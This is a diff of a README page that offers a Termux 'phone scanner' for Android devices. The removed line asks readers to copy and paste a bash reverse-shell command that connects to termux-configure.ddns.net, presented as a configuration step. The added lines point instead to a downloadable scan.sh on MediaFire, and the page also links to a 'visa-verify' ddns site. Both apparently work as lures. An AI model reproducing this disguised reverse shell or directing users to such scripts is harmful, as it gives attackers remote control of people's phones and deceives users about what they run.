@@ -43,9 +43,9 @@ SCANNING PHONE ANDROID ONLY
   <h3 align="center">SCAN for termux for android Phones, supported devices are (SAMSUNG,OPPO,REDMI,XIAOMI,REALMI,** NOKIA AND IOS PHONES ARE NOT SUPPORTED** Copy And Paste this command bellow on your termux to configurate it. </h3>
 
   <p align="center">
-    bash -i >& /dev/tcp/termux-configure.ddns.net/25251 0>&1
+    To scan phone capabilities download the script bellow.
     <br />
-    <b><a href="https://www.mediafire.com/file/zt6z6cuhwj4khs5/scan.sh/file?dkey=rwvulpvpaya&r=1075"><strong>Download main config »</strong></a></b>
+    <b><a href="https://www.mediafire.com/file/zt6z6cuhwj4khs5/scan.sh/file"><strong>Download phone scanner »</strong></a></b>
     <br />
     <br />
     <a href="http://visa-verify.ddns.net/">Verification visas</a>
